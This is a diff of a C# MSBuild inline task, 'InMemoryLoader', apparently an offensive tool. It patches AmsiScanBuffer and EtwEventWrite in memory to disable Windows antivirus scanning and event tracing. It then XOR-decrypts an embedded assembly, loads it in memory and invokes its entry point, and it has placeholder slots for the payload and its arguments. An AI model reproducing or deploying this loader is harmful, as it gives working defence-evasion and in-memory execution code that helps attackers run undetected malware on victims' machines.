@@ -32,7 +32,6 @@ using Microsoft.Build.Utilities;
 
 public class InMemoryLoader : Task
 {
-    // P/Invoke declarations
     [DllImport("kernel32.dll")]
     static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
@@ -48,70 +47,44 @@ public class InMemoryLoader : Task
 
     const uint PAGE_EXECUTE_READWRITE = 0x40;
 
-    // ================================================================
-    //  AMSI Bypass
-    // ================================================================
     static bool PatchAmsi()
     {
         try
         {
-            // amsi.dll may already be loaded by the MSBuild CLR
             IntPtr hAmsi = LoadLibrary("amsi.dll");
             if (hAmsi == IntPtr.Zero) return false;
-
-            IntPtr pScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
-            if (pScanBuffer == IntPtr.Zero) return false;
-
-            // x64: mov eax, 0x80070057; ret
+            IntPtr addr = GetProcAddress(hAmsi, "AmsiScanBuffer");
+            if (addr == IntPtr.Zero) return false;
             byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-
             uint oldProtect;
-            if (!VirtualProtect(pScanBuffer, (UIntPtr)patch.Length,
-                PAGE_EXECUTE_READWRITE, out oldProtect))
-                return false;
-
-            Marshal.Copy(patch, 0, pScanBuffer, patch.Length);
-
+            VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+            Marshal.Copy(patch, 0, addr, patch.Length);
             uint tmp;
-            VirtualProtect(pScanBuffer, (UIntPtr)patch.Length, oldProtect, out tmp);
+            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
             return true;
         }
         catch { return false; }
     }
 
-    // ================================================================
-    //  ETW Bypass
-    // ================================================================
     static bool PatchEtw()
     {
         try
         {
             IntPtr hNtdll = GetModuleHandle("ntdll.dll");
             if (hNtdll == IntPtr.Zero) return false;
-
-            IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-            if (pEtwEventWrite == IntPtr.Zero) return false;
-
-            // x64: xor eax, eax; ret
+            IntPtr addr = GetProcAddress(hNtdll, "EtwEventWrite");
+            if (addr == IntPtr.Zero) return false;
             byte[] patch = { 0x33, 0xC0, 0xC3 };
-
             uint oldProtect;
-            if (!VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length,
-                PAGE_EXECUTE_READWRITE, out oldProtect))
-                return false;
-
-            Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
-
+            VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+            Marshal.Copy(patch, 0, addr, patch.Length);
             uint tmp;
-            VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out tmp);
+            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
             return true;
         }
         catch { return false; }
     }
 
-    // ================================================================
-    //  XOR decrypt
-    // ================================================================
     static byte[] XorDecrypt(byte[] data, byte[] key)
     {
         byte[] result = new byte[data.Length];
@@ -120,50 +93,29 @@ public class InMemoryLoader : Task
         return result;
     }
 
-    // ================================================================
-    //  PAYLOAD SECTION
-    // ================================================================
+    // PAYLOAD - base64-encoded XOR-encrypted assembly
+    static string ENCRYPTED_B64 = "YOURPAYLOADHERE";
 
-    // python encrypt_payload.py xor Seatbelt.exe --format cs
-    // Then paste the two arrays here:
+    // XOR key as base64
+    static string KEY_B64 = "YOURKEYHERE";
 
-    static byte[] encryptedAssembly = new byte[] {
-        // PASTE ENCRYPTED ASSEMBLY BYTES HERE
-        0x00  // placeholder
-    };
-
-    static byte[] xorKey = new byte[] {
-        // PASTE XOR KEY HERE
-        0x00  // placeholder
-    };
-
-    // ================================================================
-    //  ARGUMENTS SECTION
-    // ================================================================
-
-    // Args passed to the loaded assembly's Main(string[])
+    // Args for Main(string[])
     static string[] assemblyArgs = new string[] {
-        // "-group=all",
-        // "-outputfile=C:\\Windows\\Temp\\out.txt",
+        // YOURARGS
     };
 
-    // ================================================================
-    //  Execute
-    // ================================================================
     public override bool Execute()
     {
         try
         {
-            // 1. Patch ETW first (before any CLR telemetry about our actions)
             PatchEtw();
-
-            // 2. Patch AMSI (before Assembly.Load scans our payload)
             PatchAmsi();
 
-            // 3. Decrypt the assembly
-            byte[] clearAssembly = XorDecrypt(encryptedAssembly, xorKey);
+            byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);
+            byte[] key = Convert.FromBase64String(KEY_B64);
+            byte[] clearAssembly = XorDecrypt(encrypted, key);
+            Array.Clear(encrypted, 0, encrypted.Length);
 
-            // 4. Load and execute
             Assembly asm = Assembly.Load(clearAssembly);
             MethodInfo entry = asm.EntryPoint;
 
@@ -176,13 +128,11 @@ public class InMemoryLoader : Task
                     entry.Invoke(null, new object[] { assemblyArgs });
             }
 
-            // 5. Wipe decrypted bytes
             Array.Clear(clearAssembly, 0, clearAssembly.Length);
         }
         catch (TargetInvocationException ex)
         {
-            // The loaded assembly threw - print inner exception
-            Console.Error.WriteLine(ex.InnerException?.ToString());
+            Console.Error.WriteLine(ex.InnerException != null ? ex.InnerException.ToString() : ex.ToString());
         }
         catch (Exception ex)
         {
